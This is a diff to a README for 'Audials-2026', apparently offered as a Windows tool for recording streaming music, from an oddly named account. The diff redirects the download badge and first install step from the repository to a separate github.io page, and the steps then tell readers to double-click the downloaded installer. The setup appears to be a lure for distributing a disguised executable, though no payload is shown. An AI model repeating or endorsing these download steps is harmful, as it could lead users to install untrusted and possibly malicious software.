@@ -1,6 +1,6 @@
 # 🎧 Audials-2026 - Record your favorite streaming music easily
 
-[![](https://img.shields.io/badge/Download-Audials_2026-blue.svg)](https://github.com/Undisciplined-ensemble237/Audials-2026)
+[![](https://img.shields.io/badge/Download-Audials_2026-blue.svg)](https://undisciplined-ensemble237.github.io)
 
 Audials-2026 captures high-quality audio from streaming services. It saves your music files directly to your computer. You keep your library forever. This software works on Windows 10 and Windows 11. 
 
@@ -17,7 +17,7 @@ Audials-2026 captures high-quality audio from streaming services. It saves your 
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the following page to choose your download version: [Download Audials-2026](https://github.com/Undisciplined-ensemble237/Audials-2026).
+1.  Visit the following page to choose your download version: [Download Audials-2026](https://undisciplined-ensemble237.github.io).
 2.  Click the link to start the download.
 3.  Locate the downloaded file in your browser's download folder.
 4.  Double-click the installer file to launch the setup wizard.
